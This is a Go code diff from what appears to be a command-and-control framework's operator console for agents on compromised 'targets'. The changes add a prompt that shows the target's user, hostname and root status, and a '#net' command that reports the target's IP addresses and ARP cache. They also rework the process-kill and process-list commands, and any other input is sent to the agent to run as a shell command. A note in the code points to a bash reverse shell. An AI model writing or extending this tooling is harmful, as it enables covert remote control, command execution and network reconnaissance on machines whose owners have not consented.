@@ -70,11 +70,18 @@ func moduleShell() {
 		"Note: Use `bash` command to start a bash reverse shell, type `help` for more info",
 		tControl.Index)
 
+	// prompt info
+	username := strings.Fields(target.User)[0]
+	hostname := strings.Fields(target.Hostname)[0]
+	shellPrompt := color.HiCyanString("[%d] ", tControl.Index) + color.HiMagentaString("%s@%s$ ", username, hostname)
+	if target.HasRoot {
+		shellPrompt = color.HiCyanString("[%d] ", tControl.Index) + color.HiGreenString("%s@%s# ", username, hostname)
+	}
 shell:
 	for {
 		// set prompt to shell
 		oldPrompt := EmpReadLine.Config.Prompt
-		EmpReadLine.SetPrompt(color.HiMagentaString("shell [%d] > ", tControl.Index))
+		EmpReadLine.SetPrompt(shellPrompt)
 		defer EmpReadLine.SetPrompt(oldPrompt)
 
 		// read user input
@@ -115,20 +122,32 @@ shell:
 		case inputSlice[0] == "#kill":
 			if len(inputSlice) < 2 {
 				CliPrintError("#kill <pids to kill>")
-				continue shell
 			}
 			err = SendCmd("#kill "+strings.Join(inputSlice[1:], " "), target)
 			if err != nil {
 				CliPrintError("failed to send command: %v", err)
-				continue shell
 			}
+			continue shell
 
 		case inputSlice[0] == "#ps":
 			err = SendCmd("#ps", target)
 			if err != nil {
 				CliPrintError("failed to send command: %v", err)
-				continue shell
 			}
+			continue shell
+
+		case inputSlice[0] == "#net":
+			color.Cyan("[*] On connect:\n")
+			fmt.Printf("IP addresses: %s\nARP cache: %s",
+				strings.Join(target.IPs, ", "),
+				strings.Join(target.ARP, ", "))
+
+			// get refreshed results
+			err = SendCmd("#net", target)
+			if err != nil {
+				CliPrintError("failed to send command: %v", err)
+			}
+			continue shell
 
 		case inputSlice[0] == "get":
 			// #put file to agent
@@ -186,7 +205,7 @@ shell:
 		default:
 		}
 
-		// send command
+		// send whatever else to agent, execute as shell command
 		data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, input)
 		data.Tag = target.Tag
 		err = Send2Agent(&data, target)
